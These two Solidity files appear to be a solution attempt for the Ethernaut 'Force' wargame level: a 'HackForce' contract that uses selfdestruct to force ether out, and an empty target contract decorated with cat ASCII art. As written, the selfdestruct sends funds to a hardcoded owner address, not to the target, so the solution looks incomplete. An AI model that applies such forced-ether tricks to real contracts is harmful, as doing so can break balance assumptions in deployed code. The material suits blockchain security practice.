// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Force.sol';

contract HackForce {
    address payable private owner = payable(0xF7c76375227291b07Ed724f3C312B9029e8bA4fA);
    mapping(address => uint256) allocations;

    constructor() payable {
        allocations[owner] = msg.value;
    }

    function selfDestruct() public {
        selfdestruct(owner);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

contract Force { /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/ }